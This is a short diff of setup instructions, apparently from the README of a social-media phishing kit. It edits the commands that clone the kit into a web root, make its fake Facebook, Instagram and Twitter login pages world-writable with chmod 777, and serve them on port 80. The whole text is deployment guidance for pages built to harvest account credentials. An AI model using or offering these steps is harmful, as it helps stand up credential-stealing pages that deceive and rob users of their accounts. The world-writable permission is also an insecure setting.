@@ -11,8 +11,8 @@ Terminal 1
 ```
 git clone https://github.com/4xx404/social-media-phishing
 mv ~/social-media-phishing /var/www/html/
-chmod 777 /var/www/html/social-media-phishing/siteFolder/index.php
-cd /var/www/html/
+cd /var/www/html/social-media-phishing/
+chmod 777 facebook/index.php instagram/index.php twitter/index.php && cd ../
 php -S localhost:80
 ```
 
